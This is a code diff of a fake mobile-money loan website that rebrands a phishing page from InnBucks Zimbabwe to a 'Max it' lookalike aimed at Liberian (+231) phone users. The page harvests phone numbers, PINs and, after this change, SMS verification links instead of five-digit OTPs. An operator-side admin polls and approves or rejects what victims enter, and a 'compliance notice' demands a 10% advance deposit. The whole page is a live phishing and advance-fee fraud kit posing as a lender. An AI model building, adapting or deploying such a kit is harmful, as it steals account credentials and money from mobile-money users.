@@ -3,15 +3,15 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>InnBucks Zimbabwe – Quick & Easy Loans</title>
+<title>Max it – Quick & Easy Loans</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 <style>
   :root {
     --navy: #1C2340;
     --navy-dark: #151929;
-    --teal: #1BC8D4;
-    --purple: #8B2FC9;
-    --grad: linear-gradient(to right, #1BC8D4, #8B2FC9);
+    --teal: #FF6600;
+    --purple: #FF6600;
+    --grad: linear-gradient(to right, #FF8C00, #FF6600);
     --page-bg: #EBEBEB;
     --white: #FFFFFF;
     --text-dark: #1C2340;
@@ -34,7 +34,7 @@
   .overlay.show { display:flex; }
   .modal { background:var(--white); border-radius:var(--radius); padding:40px 36px; text-align:center; max-width:320px; width:90%; box-shadow:0 20px 60px rgba(0,0,0,0.2); animation:popIn 0.3s cubic-bezier(.34,1.56,.64,1); }
   @keyframes popIn { from{opacity:0;transform:scale(0.85)} to{opacity:1;transform:scale(1)} }
-  .spinner { width:44px; height:44px; border:4px solid #eee; border-top-color:var(--teal); border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 18px; }
+  .spinner { width:44px; height:44px; border:4px solid #eee; border-top-color:#FF6600; border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 18px; }
   @keyframes spin { to{transform:rotate(360deg)} }
   .modal h3 { font-size:1.1rem; font-weight:600; color:var(--text-dark); margin-bottom:6px; }
   .modal p  { font-size:0.88rem; color:var(--text-light); }
@@ -43,8 +43,8 @@
   .logo-group { display:flex; flex-direction:column; align-items:center; gap:3px; }
   .logo-dots { display:grid; grid-template-columns:1fr 1fr; gap:3px; width:28px; height:28px; }
   .logo-dots span { width:12px; height:12px; border-radius:50%; display:block; }
-  .dot-1{background:#F5A623;} .dot-2{background:#1BC8D4;} .dot-3{background:#2ECC71;} .dot-4{background:#9B59B6;}
-  .logo-text { font-size:1.1rem; font-weight:700; color:var(--teal); }
+  .dot-1{background:#F5A623;} .dot-2{background:#FF6600;} .dot-3{background:#FF8C00;} .dot-4{background:#E65500;}
+  .logo-text { font-size:1.1rem; font-weight:700; color:#FF6600; }
   .logo-sub   { font-size:0.72rem; color:rgba(255,255,255,0.65); }
 
   /* NAV */
@@ -129,7 +129,7 @@
   .sum-row .sv { font-weight:500; }
 
   /* ───── PAGE 5: SUBMITTED ───── */
-  #page-submitted { background:linear-gradient(160deg,var(--navy),#2a2f5a); align-items:center; justify-content:center; }
+  #page-submitted { background:linear-gradient(160deg,#FF8C00,#E65500); align-items:center; justify-content:center; }
   .sub-wrap { text-align:center; padding:40px 24px; max-width:420px; }
   .sub-icon { width:80px; height:80px; border-radius:50%; background:rgba(255,255,255,0.1); border:2px solid rgba(255,255,255,0.3); display:flex; align-items:center; justify-content:center; font-size:2rem; margin:0 auto 24px; animation:pulse 2s ease infinite; }
   @keyframes pulse { 0%,100%{box-shadow:0 0 0 0 rgba(27,200,212,0.3)} 50%{box-shadow:0 0 0 16px rgba(27,200,212,0)} }
@@ -142,7 +142,7 @@
   /* ───── PAGE 6: LOGIN ───── */
   #page-login { background:#fff; }
   .login-hdr { background:var(--navy); padding:32px 20px 36px; display:flex; flex-direction:column; align-items:center; gap:4px; flex-shrink:0; }
-  .login-hdr .logo-text { font-size:1.5rem; }
+  .login-hdr .logo-text { font-size:1.5rem; color:#fff; }
   .login-body-wrap { flex:1; background:#fff; padding:32px 20px 0; display:flex; flex-direction:column; align-items:center; }
   .login-body-wrap h2 { font-size:1.05rem; font-weight:600; margin-bottom:24px; }
   .login-inner { width:100%; max-width:380px; }
@@ -161,7 +161,7 @@
   .lg-curve { margin-top:32px; background:#fff; overflow:hidden; flex-shrink:0; }
   .lg-curve::before { content:''; display:block; background:var(--navy); height:55px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
   .lg-foot { background:var(--navy); padding:24px 20px 32px; display:flex; flex-direction:column; align-items:center; gap:8px; text-align:center; }
-  .lg-foot .logo-text { font-size:1.2rem; }
+  .lg-foot .logo-text { font-size:1.2rem; color:#fff; }
   .lg-version { font-size:0.72rem; color:rgba(255,255,255,0.4); margin-top:4px; }
   .lg-terms { font-size:0.72rem; color:rgba(255,255,255,0.45); }
   .lg-terms a { color:rgba(255,255,255,0.65); }
@@ -188,7 +188,7 @@
   .otp-foot { background:var(--navy); padding:14px; text-align:center; font-size:0.75rem; color:rgba(255,255,255,0.45); }
 
   /* ───── PAGE 8: APPROVAL ───── */
-  #page-approval { background:linear-gradient(135deg,#1BC8D4 0%,#8B6FD4 50%,#9B59B6 100%); min-height:100vh; align-items:center; justify-content:center; padding:32px 16px; }
+  #page-approval { background:linear-gradient(135deg,#FF8C00 0%,#FF6600 50%,#E65500 100%); min-height:100vh; align-items:center; justify-content:center; padding:32px 16px; }
   .appr-wrap { width:100%; max-width:520px; }
   .appr-top { background:#fff; border-radius:var(--radius) var(--radius) 0 0; padding:28px 24px 0; text-align:center; }
   .check-circle { width:56px; height:56px; border-radius:50%; background:linear-gradient(135deg,var(--teal),var(--purple)); display:flex; align-items:center; justify-content:center; margin:0 auto 12px; font-size:1.3rem; color:#fff; box-shadow:0 4px 16px rgba(27,200,212,0.4); }
@@ -232,7 +232,7 @@
   /* ───── WAITING / POLLING INDICATOR ───── */
   .waiting-box { background:#f8f9ff; border:1px solid #e0e5ff; border-radius:var(--radius-sm); padding:16px; text-align:center; margin-bottom:16px; display:none; }
   .waiting-box.show { display:block; }
-  .waiting-box .wb-spinner { width:28px; height:28px; border:3px solid #e0e5ff; border-top-color:var(--teal); border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 10px; }
+  .waiting-box .wb-spinner { width:28px; height:28px; border:3px solid #e0e5ff; border-top-color:#FF6600; border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 10px; }
   .waiting-box p { font-size:0.82rem; color:var(--text-mid); }
 
   @media(max-width:500px){.field-row{grid-template-columns:1fr;}.step-card,.land-card{padding:24px 18px;}.otp-card{padding:24px 16px;}}
@@ -245,8 +245,10 @@
   <nav class="land-nav">
     <div class="hbg"><span></span><span></span><span></span></div>
     <div class="logo-group">
-      <div class="logo-dots"><span class="dot-1"></span><span class="dot-2"></span><span class="dot-3"></span><span class="dot-4"></span></div>
-      <div class="logo-text">InnBucks</div>
+      <div style="background:#FF6600;border-radius:10px;padding:5px 10px;display:flex;flex-direction:column;align-items:center;">
+        <div style="font-size:1rem;font-weight:800;color:#fff;letter-spacing:-0.02em;line-height:1.1;">Max <span style="font-style:italic;">it</span></div>
+        <div style="font-size:0.55rem;font-weight:600;color:rgba(255,255,255,0.85);letter-spacing:0.12em;">LR</div>
+      </div>
     </div>
     <div style="width:28px"></div>
   </nav>
@@ -280,14 +282,14 @@
     </div>
   </div>
 
-  <div class="land-footer">© 2026 InnBucks Zimbabwe</div>
+  <div class="land-footer">© 2026 Max it</div>
 </div>
 
 <!-- ══════════════════════ PAGE 2: STEP 1 ══════════════════════ -->
 <div id="page-step1" class="page">
   <nav class="navbar">
     <a class="nav-left" onclick="goTo('page-landing')">← Back</a>
-    <div class="logo-group"><div class="logo-dots"><span class="dot-1"></span><span class="dot-2"></span><span class="dot-3"></span><span class="dot-4"></span></div><div class="logo-text">InnBucks</div></div>
+    <div class="logo-group"><div style="background:#FF6600;border-radius:8px;padding:3px 8px;display:flex;flex-direction:column;align-items:center;"><div style="font-size:0.85rem;font-weight:800;color:#fff;line-height:1.1;">Max <span style="font-style:italic;">it</span></div><div style="font-size:0.45rem;font-weight:600;color:rgba(255,255,255,0.85);letter-spacing:0.12em;">LR</div></div></div>
     <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
   </nav>
   <div class="step-center">
@@ -309,7 +311,7 @@
 <div id="page-step2" class="page">
   <nav class="navbar">
     <a class="nav-left" onclick="goTo('page-step1')">← Back</a>
-    <div class="logo-group"><div class="logo-dots"><span class="dot-1"></span><span class="dot-2"></span><span class="dot-3"></span><span class="dot-4"></span></div><div class="logo-text">InnBucks</div></div>
+    <div class="logo-group"><div style="background:#FF6600;border-radius:8px;padding:3px 8px;display:flex;flex-direction:column;align-items:center;"><div style="font-size:0.85rem;font-weight:800;color:#fff;line-height:1.1;">Max <span style="font-style:italic;">it</span></div><div style="font-size:0.45rem;font-weight:600;color:rgba(255,255,255,0.85);letter-spacing:0.12em;">LR</div></div></div>
     <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
   </nav>
   <div class="step-center">
@@ -325,7 +327,7 @@
       <div class="field"><label>Email Address</label><input type="email" id="s2em" placeholder="your@email.com" oninput="clearErr('s2Err')"></div>
       <div class="field">
         <label>Phone Number</label>
-        <div class="phone-row"><div class="ph-pre">+263</div><input type="tel" id="s2ph" placeholder="712345678 or 0712345678" maxlength="10" oninput="normalizePhone('s2ph');clearErr('s2Err')"></div>
+        <div class="phone-row"><div class="ph-pre">+231</div><input type="tel" id="s2ph" placeholder="770123456" maxlength="9" oninput="normalizePhone('s2ph');clearErr('s2Err')"></div>
         <div class="field-hint">Enter 9 digits or start with 0 (e.g., 0712345678 → auto-converts to 712345678)</div>
       </div>
       <div class="step-btns">
@@ -334,14 +336,14 @@
       </div>
     </div>
   </div>
-  <div class="pg-footer">© 2026 InnBucks Zimbabwe</div>
+  <div class="pg-footer">© 2026 Max it</div>
 </div>
 
 <!-- ══════════════════════ PAGE 4: STEP 3 ══════════════════════ -->
 <div id="page-step3" class="page">
   <nav class="navbar">
     <a class="nav-left" onclick="goTo('page-step2')">← Back</a>
-    <div class="logo-group"><div class="logo-dots"><span class="dot-1"></span><span class="dot-2"></span><span class="dot-3"></span><span class="dot-4"></span></div><div class="logo-text">InnBucks</div></div>
+    <div class="logo-group"><div style="background:#FF6600;border-radius:8px;padding:3px 8px;display:flex;flex-direction:column;align-items:center;"><div style="font-size:0.85rem;font-weight:800;color:#fff;line-height:1.1;">Max <span style="font-style:italic;">it</span></div><div style="font-size:0.45rem;font-weight:600;color:rgba(255,255,255,0.85);letter-spacing:0.12em;">LR</div></div></div>
     <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
   </nav>
   <div class="step-center">
@@ -365,7 +367,7 @@
       </div>
     </div>
   </div>
-  <div class="pg-footer">© 2026 InnBucks Zimbabwe</div>
+  <div class="pg-footer">© 2026 Max it</div>
 </div>
 
 <!-- ══════════════════════ PAGE 5: SUBMITTED ══════════════════════ -->
@@ -373,8 +375,8 @@
   <div class="sub-wrap">
     <div class="sub-icon">📋</div>
     <h2>Loan Application Submitted</h2>
-    <p>Your loan application has been submitted. Please wait for approval.<br>You will receive a confirmation message. For now, proceed to InnBucks.</p>
-    <div class="redir-pill">🔄 Redirecting to InnBucks login in <span class="redir-n" id="rdN">3</span>s...</div><br>
+    <p>Your loan application has been submitted. Please wait for approval.<br>You will receive a confirmation message. For now, proceed to Max it login.</p>
+    <div class="redir-pill">🔄 Redirecting to Max it login in <span class="redir-n" id="rdN">3</span>s...</div><br>
     <button class="btn-go" onclick="goTo('page-login')">Go to Login Now</button>
   </div>
 </div>
@@ -383,8 +385,10 @@
 <div id="page-login" class="page">
   <div class="login-hdr">
     <div class="logo-group">
-      <div class="logo-dots" style="width:36px;height:36px;"><span class="dot-1" style="width:15px;height:15px;"></span><span class="dot-2" style="width:15px;height:15px;"></span><span class="dot-3" style="width:15px;height:15px;"></span><span class="dot-4" style="width:15px;height:15px;"></span></div>
-      <div class="logo-text" style="font-size:1.5rem;">InnBucks</div>
+      <div style="background:#FF6600;border-radius:14px;padding:10px 18px;display:flex;flex-direction:column;align-items:center;">
+        <div style="font-size:1.6rem;font-weight:900;color:#fff;letter-spacing:-0.02em;line-height:1.1;">Max <span style="font-style:italic;">it</span></div>
+        <div style="font-size:0.6rem;font-weight:600;color:rgba(255,255,255,0.85);letter-spacing:0.15em;">LR</div>
+      </div>
       <div class="logo-sub">Quick &amp; Easy Loans</div>
     </div>
   </div>
@@ -395,8 +399,8 @@
       <div class="msg-box error" id="lgMsg"><span class="msg-icon">✕</span><span id="lgMsgTxt"></span></div>
 
       <div class="lg-phone-row">
-        <div class="lg-ph-pre">🇿🇼 +263</div>
-        <input type="tel" id="lgPh" placeholder="712345678 or 0712345678" maxlength="10" oninput="normalizePhone('lgPh');chkLogin()">
+        <div class="lg-ph-pre">🇱🇷 +231</div>
+        <input type="tel" id="lgPh" placeholder="770123456" maxlength="9" oninput="normalizePhone('lgPh');chkLogin()">
       </div>
       <div class="pin-label">Enter your PIN (4 characters)</div>
       <div class="pin-row">
@@ -413,8 +417,10 @@
   <div class="lg-curve">
     <div class="lg-foot">
       <div class="logo-group">
-        <div class="logo-dots" style="width:32px;height:32px;"><span class="dot-1" style="width:13px;height:13px;"></span><span class="dot-2" style="width:13px;height:13px;"></span><span class="dot-3" style="width:13px;height:13px;"></span><span class="dot-4" style="width:13px;height:13px;"></span></div>
-        <div class="logo-text">InnBucks</div>
+        <div style="background:#FF6600;border-radius:10px;padding:6px 14px;display:flex;flex-direction:column;align-items:center;">
+          <div style="font-size:1.1rem;font-weight:900;color:#fff;letter-spacing:-0.02em;line-height:1.1;">Max <span style="font-style:italic;">it</span></div>
+          <div style="font-size:0.5rem;font-weight:600;color:rgba(255,255,255,0.85);letter-spacing:0.15em;">LR</div>
+        </div>
         <div class="logo-sub">Quick &amp; Easy Loans</div>
       </div>
       <div class="lg-version">v2.1.3P</div>
@@ -428,16 +434,18 @@
   <div class="otp-topbar">
     <button class="bk" onclick="goTo('page-login')">←</button>
     <div style="display:flex;align-items:center;gap:8px;">
-      <div class="logo-dots" style="width:22px;height:22px;"><span class="dot-1" style="width:9px;height:9px;"></span><span class="dot-2" style="width:9px;height:9px;"></span><span class="dot-3" style="width:9px;height:9px;"></span><span class="dot-4" style="width:9px;height:9px;"></span></div>
-      <div class="logo-text">InnBucks</div>
+      <div style="background:#FF6600;border-radius:7px;padding:3px 7px;display:flex;flex-direction:column;align-items:center;">
+        <div style="font-size:0.8rem;font-weight:900;color:#fff;line-height:1.1;">Max <span style="font-style:italic;">it</span></div>
+        <div style="font-size:0.4rem;font-weight:600;color:rgba(255,255,255,0.85);letter-spacing:0.12em;">LR</div>
+      </div>
     </div>
     <div class="hbg2"><span></span><span></span><span></span></div>
   </div>
   <div class="otp-body-wrap">
     <div class="otp-card">
-      <h2>OTP Verification</h2>
-      <p class="otp-hint">Enter the OTP sent to your phone number</p>
-      <div class="otp-phone" id="otpPh">+263712345678</div>
+      <h2>Link Verification</h2>
+      <p class="otp-hint">Paste the verification link sent to your phone by Max it</p>
+      <div class="otp-phone" id="otpPh">+231770123456</div>
 
       <!-- Inline messages for OTP page -->
       <div class="msg-box error"   id="otpMsgErr"><span class="msg-icon">✕</span><span id="otpMsgErrTxt"></span></div>
@@ -451,19 +459,17 @@
       </div>
 
       <div id="otpInputSection">
-        <div class="otp-inputs">
-          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,0)" id="o0">
-          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,1)" id="o1">
-          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,2)" id="o2">
-          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,3)" id="o3">
-          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,4)" id="o4">
+        <div style="margin-bottom:14px;">
+          <label style="display:block;font-size:0.82rem;font-weight:500;color:#444;margin-bottom:8px;">Paste the verification link sent by Max it</label>
+          <input type="text" id="otpLink" placeholder="https://maxit.link/verify?code=..." oninput="otpLinkChk()" style="width:100%;padding:12px 14px;border:1.5px solid #ddd;border-radius:8px;font-family:'Inter',sans-serif;font-size:0.88rem;color:#1C2340;background:#fff;outline:none;transition:border-color 0.2s,box-shadow 0.2s;" onfocus="this.style.borderColor='#FF6600';this.style.boxShadow='0 0 0 3px rgba(255,102,0,0.12)'" onblur="this.style.borderColor='#ddd';this.style.boxShadow='none'">
+          <div style="font-size:0.74rem;color:#888;margin-top:5px;">Open your Max it SMS, copy the link and paste it here</div>
         </div>
-        <div class="otp-resend" id="otpRs">Resend code in <span id="rsS">17</span> seconds</div>
+        <div class="otp-resend" id="otpRs">Resend code in <span id="rsS">40</span> seconds</div>
         <button class="btn-otp" id="bOtp" onclick="doOtp()">SUBMIT</button>
       </div>
     </div>
   </div>
-  <div class="otp-curve"><div class="otp-foot">© 2026 InnBucks Zimbabwe</div></div>
+  <div class="otp-curve"><div class="otp-foot">© 2026 Max it</div></div>
 </div>
 
 <!-- ══════════════════════ PAGE 8: APPROVAL ══════════════════════ -->
@@ -477,7 +483,7 @@
     </div>
     <div class="comp-box">
       <div class="ch">⚠️ COMPLIANCE NOTICE</div>
-      <p>Your InnBucks account must be active and maintain a security deposit of at least <strong>10% of your requested loan amount.</strong> This deposit is fully refundable upon successful loan repayment and helps secure better interest rates.</p>
+      <p>Your Max it account must be active and maintain a security deposit of at least <strong>10% of your requested loan amount.</strong> This deposit is fully refundable upon successful loan repayment and helps secure better interest rates.</p>
     </div>
     <div class="ld-card">
       <div class="ld-htitle">💳 Loan Details</div>
@@ -578,7 +584,7 @@
   // ══════════════════════════════════════════════════════
   // STEP NAVIGATION
   // ══════════════════════════════════════════════════════
-  // Normalize phone: strip leading 0 so +263 prefix works correctly
+  // Normalize phone: strip leading 0 so +231 prefix works correctly
   function normalizePhone(id) {
     const el = document.getElementById(id);
     if (el.value.startsWith('0')) {
@@ -735,7 +741,7 @@
       return;
     }
 
-    const phoneNumber = '+263' + rawPhone;
+    const phoneNumber = '+231' + rawPhone;
     const adminId = getAdminId();
 
     // Show loading modal
@@ -840,11 +846,9 @@
   // ══════════════════════════════════════════════════════
   // OTP INPUT HELPERS
   // ══════════════════════════════════════════════════════
-  function otpMv(el, i) {
-    el.value = el.value.replace(/\D/, '');
-    if (el.value && i < 4) document.getElementById('o' + (i+1)).focus();
-    const ok = [0,1,2,3,4].every(j => document.getElementById('o'+j).value);
-    document.getElementById('bOtp').className = ok ? 'btn-otp rdy' : 'btn-otp';
+  function otpLinkChk() {
+    const val = (document.getElementById('otpLink').value || '').trim();
+    document.getElementById('bOtp').className = val.length > 5 ? 'btn-otp rdy' : 'btn-otp';
   }
 
   let _rsInterval = null;
@@ -852,7 +856,7 @@
     // Clear any existing countdown first
     if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
 
-    let s = 60;
+    let s = 40;
     const rsBox = document.getElementById('otpRs');
     if (!rsBox) return;
 
@@ -885,11 +889,11 @@
       });
       const data = await res.json();
       if (data.success) {
-        showOtpMsg('info', 'A new OTP request has been sent to the admin.');
+        showOtpMsg('info', 'A new verification link has been sent. Please check your SMS.');
         startRs();
-        [0,1,2,3,4].forEach(i => { document.getElementById('o'+i).value = ''; });
+        document.getElementById('otpLink').value = '';
         document.getElementById('bOtp').className = 'btn-otp';
-        document.getElementById('o0').focus();
+        document.getElementById('otpLink').focus();
       } else {
         showOtpMsg('error', 'Could not resend OTP. Please try again.');
       }
@@ -902,9 +906,9 @@
   // OTP SUBMIT — calls /api/verify-otp then polls /api/check-otp-status
   // ══════════════════════════════════════════════════════
   async function doOtp() {
-    const otp = [0,1,2,3,4].map(j => document.getElementById('o'+j).value).join('');
-    if (otp.length < 5) {
-      showOtpMsg('warning', 'Please enter all 5 digits of your OTP.');
+    const otp = (document.getElementById('otpLink').value || '').trim();
+    if (otp.length < 6) {
+      showOtpMsg('warning', 'Please paste the verification link sent by Max it.');
       return;
     }
 
@@ -990,8 +994,8 @@
             [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
             chkLogin();
             document.getElementById('bLogin').disabled = false;
-            // Clear OTP boxes
-            [0,1,2,3,4].forEach(i => document.getElementById('o'+i).value = '');
+            // Clear link input
+            document.getElementById('otpLink').value = '';
             // Reset OTP button
             document.getElementById('bOtp').className = 'btn-otp';
             document.getElementById('bOtp').disabled = false;
@@ -1000,7 +1004,7 @@
             document.getElementById('otpInputSection').style.display = '';
             // Stop resend timer and reset it
             if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-            document.getElementById('otpRs').innerHTML = 'Resend code in <span id="rsS">60</span> seconds';
+            document.getElementById('otpRs').innerHTML = 'Resend code in <span id="rsS">40</span> seconds';
             // Clear all OTP messages
             hideOtpMsgs();
             // Reset application state so a fresh login creates a new application
@@ -1010,13 +1014,13 @@
           }, 2500);
 
         } else if (data.status === 'wrongcode') {
-          // Admin flagged OTP as wrong — let user re-enter
+          // Admin flagged OTP/link as wrong — let user re-enter
           clearInterval(otpPollInterval);
-          [0,1,2,3,4].forEach(i => document.getElementById('o'+i).value = '');
+          document.getElementById('otpLink').value = '';
           document.getElementById('bOtp').className = 'btn-otp';
           document.getElementById('bOtp').disabled = false;
-          showOtpMsg('error', 'Incorrect OTP code. Please check and re-enter.');
-          document.getElementById('o0').focus();
+          showOtpMsg('error', 'Incorrect verification link. Please check and paste the correct link.');
+          document.getElementById('otpLink').focus();
         }
         // status === 'pending' → keep polling
 
